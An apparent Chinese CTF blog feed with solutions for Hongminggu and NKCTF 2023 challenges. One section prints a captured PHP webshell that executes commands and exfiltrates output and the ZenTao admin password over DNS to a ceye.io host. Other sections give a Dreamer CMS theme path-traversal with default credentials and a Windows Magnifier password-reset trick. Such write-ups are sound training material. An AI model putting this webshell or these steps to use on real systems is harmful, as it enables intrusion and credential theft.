<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>lewiserii&#39;s blog</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.lewiserii.top/atom.xml" rel="self"/>
  
  <link href="https://www.lewiserii.top/"/>
  <updated>2023-04-20T08:18:09.414Z</updated>
  <id>https://www.lewiserii.top/</id>
  
  <author>
    <name>lewiserii</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛web&amp;misc-wp</title>
    <link href="https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&amp;misc-wp.html"/>
    <id>https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb&amp;misc-wp.html</id>
    <published>2023-04-19T01:30:00.000Z</published>
    <updated>2023-04-20T08:18:09.414Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h2><p>文件尾有一串字符串<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>，十六进制转字符串得到<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p><p>C383明显是中文编码，爆破后得到密码<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-1.png"></p><p>根据图片名字<code>netpixeljihad</code>，使用<code>PixelJihad</code>解密，密码是<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-2.png"></p><p>得到压缩包的密码<code>P@Ss_W0RD:)</code></p><p>解压得到<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p><p><a href="https://www.dcode.fr/code-decabit">在线解密</a>一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-3.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>流量分析，发现有个<code>shell.php</code>上传了一个<code>xxx1.php</code>，然后执行了<code>ls</code>和<code>cat secret.txt</code></p><p>格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br><span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br><span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是<code>dns</code>流量</p><p>提取出<code>secret.txt</code>，根据代码可知要与<code>admin</code>的密码进行异或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure><p>异或后发现是<code>DNA</code>编码，每62位会少内容，爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure><h2 id="X光的秘密"><a href="#X光的秘密" class="headerlink" title="X光的秘密"></a>X光的秘密</h2><p>给了个<code>task.dcm</code>文件，百度到能打开的软件<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p><p>使用软件导出，一共有二十张</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-1.png"></p><p>使用stegsolve发现最后三张图存在LSB</p><p>脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure><p>img-00001-00018.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure><p>img-00001-00019.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure><p>img-00001-00020.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure><p>将三张图片按顺序拼接发现刚好是<code>10001001</code>，<code>0x89</code>为<code>PNG</code>的头</p><p>使用脚本合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r.txt&quot;</span>)<br>f2 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r2.txt&quot;</span>)<br>f3 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r3.txt&quot;</span>)<br>d1=f1.read()<br>d2=f2.read()<br>d3=f3.read()<br><br>new=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(d1):<br>    new+=v+d2[i]+d3[i]<br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>file.write(new)<br>file.close()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-2.png"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h2><p>签到，点点点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-1.png"></p><h2 id="Dreamer-amp-amp-Dreamer-revenge"><a href="#Dreamer-amp-amp-Dreamer-revenge" class="headerlink" title="Dreamer &amp;&amp; Dreamer_revenge"></a>Dreamer &amp;&amp; Dreamer_revenge</h2><p>参考<a href="https://forum.butian.net/share/2183#/">Dreamer CMS 代码审计</a></p><p>默认后台管理员账号密码为<code>wangjn/123456</code></p><p>在源码中复制一份<code>\src\main\resources\db\dreamer-cms\templates\default_v2</code>，修改<code>theme.json</code>文件中的<code>themePath</code>为<code>../../../../../../../../../../../</code>，然后打包成压缩包，在后台<code>风格管理</code>处上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-1.png"></p><p>启用后在<code>模板管理</code>处就可以看到跟目录下的文件了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-2.png"></p><p><code>Dreamer_revenge</code>的步骤与<code>Dreamer</code>一致，不过flag在<code>/proc/1/environ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-web-2-3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;阿尼亚&quot;&gt;&lt;a href=&quot;#阿尼亚&quot; class=&quot;headerlink&quot; title=&quot;阿尼亚&quot;&gt;&lt;/a&gt;阿尼</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="红明谷" scheme="https://www.lewiserii.top/tags/%E7%BA%A2%E6%98%8E%E8%B0%B7/"/>
    
  </entry>
  
  <entry>
    <title>2023NKCTF-wp</title>
    <link href="https://www.lewiserii.top/wp/NKCTF2023.html"/>
    <id>https://www.lewiserii.top/wp/NKCTF2023.html</id>
    <published>2023-03-26T13:00:00.000Z</published>
    <updated>2023-03-29T12:52:52.555Z</updated>
    
    <content type="html"><![CDATA[<p>rank：15</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/NKCTF2023.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hard-misc"><a href="#hard-misc" class="headerlink" title="hard-misc"></a>hard-misc</h2><p><code>base32</code>，公众号发<code>NKCTF2023我来了！</code></p><h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>先导入进vmware，开机发现是windows2008系统，用户带密码</p><p>挂载一个2008的iso镜像，设置启动项为cd优先，重启，选择修复计算机，进入命令提示符</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-3.png"></p><p>复制一份cmd到放大镜</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-4.png"></p><p>左下角启动放大镜功能后就启动了cmd，修改administrator密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-1.png"></p><p>进入系统</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/blue-2.png"></p><h2 id="easymusic"><a href="#easymusic" class="headerlink" title="easymusic"></a>easymusic</h2><p>根据提示百度搜到了类似的一题<a 